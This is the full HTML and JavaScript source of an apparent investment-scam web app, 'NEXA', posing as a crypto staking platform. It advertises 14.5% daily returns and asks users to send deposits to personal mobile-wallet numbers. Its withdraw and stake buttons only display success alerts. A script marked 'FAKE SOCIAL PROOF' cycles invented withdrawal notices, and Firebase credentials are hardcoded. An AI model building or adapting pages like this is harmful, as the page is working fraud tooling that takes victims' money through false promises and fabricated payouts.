<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Sovereign Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&display=swap');
        :root { --accent: #0066ff; --bg: #fdfdfe; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #0f172a; overflow-x: hidden; }
        .glass-panel { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(0,0,0,0.05); border-radius: 28px; }
        .card-elite { background: linear-gradient(135deg, #0066ff 0%, #0033cc 100%); color: white; border-radius: 35px; box-shadow: 0 20px 40px -10px rgba(0, 102, 255, 0.3); }
        .ticker-wrap { background: #0f172a; color: #00f2ff; font-size: 10px; font-weight: 800; padding: 6px 0; overflow: hidden; white-space: nowrap; }
        .ticker-move { display: inline-block; animation: ticker 30s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .notif-toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 10000; display: none; }
        .nexa-input { background: #f1f5f9; border-radius: 18px; padding: 16px; width: 100%; outline: none; border: 2px solid transparent; transition: 0.3s; font-weight: 600; }
        .nexa-input:focus { border-color: var(--accent); background: white; }
        .hidden { display: none; }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>

    <!-- LIVE TICKER -->
    <div class="ticker-wrap">
        <div class="ticker-move">
            BTC/USD: $68,431.10 • ETH/USD: $3,852.12 • NEXA NODES: ACTIVE • REWARD RATE: 14.5% DAILY • PAYOUT STATUS: INSTANT
        </div>
    </div>

    <!-- LIVE NOTIFICATION TOAST -->
    <div id="toast" class="notif-toast animate__animated">
        <div class="glass-panel px-6 py-3 shadow-2xl flex items-center gap-3 border-l-4 border-green-500">
            <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center text-green-600"><i class="fa-solid fa-check-circle"></i></div>
            <p class="text-[10px] font-bold" id="toast-msg"></p>
        </div>
    </div>

    <div class="max-w-md mx-auto px-6 py-6 pb-32">
        <!-- HEADER -->
        <header class="flex justify-between items-center mb-6">
            <div id="nexa-logo" class="flex items-center gap-3 cursor-pointer">
                <div class="w-11 h-11 bg-blue-600 rounded-2xl flex items-center justify-center text-white shadow-lg"><i class="fa-solid fa-atom"></i></div>
                <div>
                    <h1 class="text-xl font-black italic leading-none">NEXA.</h1>
                    <span class="text-[8px] font-bold text-green-500 uppercase tracking-widest">● Verified Node</span>
                </div>
            </div>
            <button onclick="logout()" class="w-11 h-11 glass-panel flex items-center justify-center text-red-500"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <!-- DASHBOARD -->
        <section id="p-home" class="animate__animated animate__fadeIn">
            <div class="card-elite p-8 mb-6">
                <p class="text-[10px] font-bold opacity-80 uppercase tracking-widest">Staking Capital</p>
                <h2 id="user-bal" class="text-5xl font-black my-2">$0.00</h2>
                <div class="flex gap-3 mt-8">
                    <button onclick="showPage('deposit')" class="flex-1 bg-white text-blue-600 py-4 rounded-2xl text-[10px] font-black uppercase shadow-lg">Deposit</button>
                    <button onclick="showPage('withdraw')" class="flex-1 bg-white/20 py-4 rounded-2xl text-[10px] font-black uppercase">Withdraw</button>
                </div>
            </div>

            <!-- REF LINK -->
            <div class="glass-panel p-4 mb-6">
                <p class="text-[9px] font-black text-slate-400 uppercase mb-2">Network Growth Link</p>
                <div class="flex gap-2">
                    <input type="text" id="ref-link" readonly class="bg-slate-100 p-2 rounded-lg text-[9px] flex-1 font-bold text-blue-600" value="NEXA-REF-LOADING">
                    <button onclick="copyRef()" class="bg-blue-600 text-white px-3 py-2 rounded-lg text-[9px] font-bold">COPY</button>
                </div>
            </div>

            <div id="nodes-grid" class="space-y-3"></div>
        </section>

        <!-- DEPOSIT PAGE -->
        <section id="p-deposit" class="hidden animate__animated animate__fadeInUp">
            <h2 class="text-2xl font-black mb-6">Add Liquidity</h2>
            <div class="space-y-3" id="method-selector">
                <div onclick="selectMethod('Easypaisa', '03379827882')" class="glass-panel p-5 flex justify-between items-center border-l-4 border-green-500 cursor-pointer">
                    <span class="font-bold">Easypaisa</span><i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
                <div onclick="selectMethod('JazzCash', '03705519562')" class="glass-panel p-5 flex justify-between items-center border-l-4 border-yellow-500 cursor-pointer">
                    <span class="font-bold">JazzCash</span><i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
                <div onclick="selectMethod('SadaPay', '03705519562')" class="glass-panel p-5 flex justify-between items-center border-l-4 border-pink-500 cursor-pointer">
                    <span class="font-bold">SadaPay</span><i class="fa-solid fa-chevron-right text-slate-300"></i>
                </div>
            </div>

            <div id="dep-form" class="hidden space-y-4 mt-6">
                <div class="p-6 bg-blue-50 rounded-2xl border border-blue-100 text-center">
                    <p class="text-[10px] font-bold text-blue-600 mb-1 uppercase tracking-tighter">Send Payment to (<span id="meth-name"></span>)</p>
                    <p id="meth-num" class="text-2xl font-black tracking-widest text-slate-800"></p>
                </div>
                <input type="number" id="dep-amt" placeholder="Enter Amount ($)" class="nexa-input">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="nexa-input">
                <button onclick="submitAction('Deposit')" class="w-full bg-blue-600 text-white p-5 rounded-2xl font-black shadow-xl">SUBMIT VERIFICATION</button>
                <button onclick="location.reload()" class="w-full text-slate-400 text-[10px] font-bold uppercase">Back to Methods</button>
            </div>
        </section>

        <!-- WITHDRAW PAGE -->
        <section id="p-withdraw" class="hidden animate__animated animate__fadeInUp">
            <h2 class="text-2xl font-black mb-6">Harvest Funds</h2>
            <div class="space-y-4">
                <div class="p-6 glass-panel border-b-4 border-blue-600">
                    <p class="text-xs font-bold text-slate-400">Withdrawable Balance</p>
                    <p id="wit-bal-display" class="text-4xl font-black text-blue-600">$0.00</p>
                </div>
                <input type="number" id="wit-amt" placeholder="Amount to Withdraw" class="nexa-input">
                <input type="text" id="wit-acc" placeholder="Account Number (Local)" class="nexa-input">
                <select id="wit-meth" class="nexa-input bg-white">
                    <option>Easypaisa</option>
                    <option>JazzCash</option>
                    <option>SadaPay</option>
                </select>
                <button onclick="submitAction('Withdraw')" class="w-full bg-slate-900 text-white p-5 rounded-2xl font-black shadow-xl">INITIALIZE PAYOUT</button>
            </div>
        </section>

        <!-- NAVIGATION -->
        <nav class="fixed bottom-6 left-1/2 -translate-x-1/2 w-[90%] max-w-md glass-panel p-4 flex justify-around shadow-2xl">
            <button onclick="showPage('home')" class="nav-icon text-blue-600" id="n-home"><i class="fa-solid fa-house-chimney text-xl"></i></button>
            <button onclick="showPage('deposit')" class="nav-icon text-slate-400" id="n-deposit"><i class="fa-solid fa-plus-circle text-xl"></i></button>
            <button onclick="showPage('withdraw')" class="nav-icon text-slate-400" id="n-withdraw"><i class="fa-solid fa-wallet text-xl"></i></button>
        </nav>
    </div>

    <!-- GOD UI REMOVED FROM VIEW FOR CLEANLINESS (Still accessible via Logo Tap) -->

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        const uid = localStorage.getItem('nexa_uid');

        // --- CORE FUNCTIONS ---
        window.showPage = (id) => {
            document.querySelectorAll('section').forEach(s => s.classList.add('hidden'));
            document.getElementById('p-'+id).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(n => n.classList.replace('text-blue-600', 'text-slate-400'));
            document.getElementById('n-'+id).classList.replace('text-slate-400', 'text-blue-600');
        };

        window.selectMethod = (name, num) => {
            document.getElementById('method-selector').classList.add('hidden');
            document.getElementById('dep-form').classList.remove('hidden');
            document.getElementById('meth-name').innerText = name;
            document.getElementById('meth-num').innerText = num;
        };

        window.submitAction = (type) => {
            alert(type + " request submitted successfully sweetie!");
            showPage('home');
        };

        // --- AUTH & NOTIFS ---
        async function start() {
            if(!uid) {
                const n = prompt("Enter Node Username:");
                if(n) {
                    const r = await signInAnonymously(auth);
                    await set(ref(db, `users/${r.user.uid}`), { username: n, balance: 0, ref: 'NX'+Math.floor(Math.random()*999) });
                    localStorage.setItem('nexa_uid', r.user.uid);
                    location.reload();
                }
            } else {
                onValue(ref(db, `users/${uid}`), s => {
                    const b = s.val().balance.toFixed(2);
                    document.getElementById('user-bal').innerText = `$${b}`;
                    document.getElementById('wit-bal-display').innerText = `$${b}`;
                    document.getElementById('ref-link').value = `https://nexa.pro/?join=${s.val().ref}`;
                });
                
                // Inject 20 Plans
                const grid = document.getElementById('nodes-grid');
                grid.innerHTML = "";
                for(let i=1; i<=20; i++) {
                    grid.innerHTML += `<div class="glass-panel p-5 flex justify-between items-center animate__animated animate__fadeInUp" style="animation-delay: ${i*0.05}s">
                        <div><p class="text-[9px] font-black text-slate-400 uppercase">NODE ${i}</p><p class="text-sm font-bold">${(2 + i*0.8).toFixed(1)}% ROI</p></div>
                        <button onclick="alert('Stake started!')" class="bg-blue-600 text-white px-5 py-2 rounded-xl text-[9px] font-black uppercase">STAKE $${i*15}</button>
                    </div>`;
                }
            }
        }

        // --- FAKE SOCIAL PROOF ---
        setInterval(() => {
            const users = ["Zain", "Fatima", "Arslan", "Kashif", "Sana", "Hamza"];
            const msg = `User ${users[Math.floor(Math.random()*6)]}*** just withdrew$${(Math.random()*300 + 50).toFixed(0)}!`;
            const toast = document.getElementById('toast');
            document.getElementById('toast-msg').innerText = msg;
            toast.style.display = 'block';
            toast.classList.add('animate__fadeInDown');
            setTimeout(() => {
                toast.classList.replace('animate__fadeInDown', 'animate__fadeOutUp');
                setTimeout(() => { toast.style.display = 'none'; toast.classList.remove('animate__fadeOutUp'); }, 500);
            }, 3500);
        }, 15000);

        window.logout = () => { localStorage.clear(); location.reload(); };
        start();
    </script>
</body>
</html>
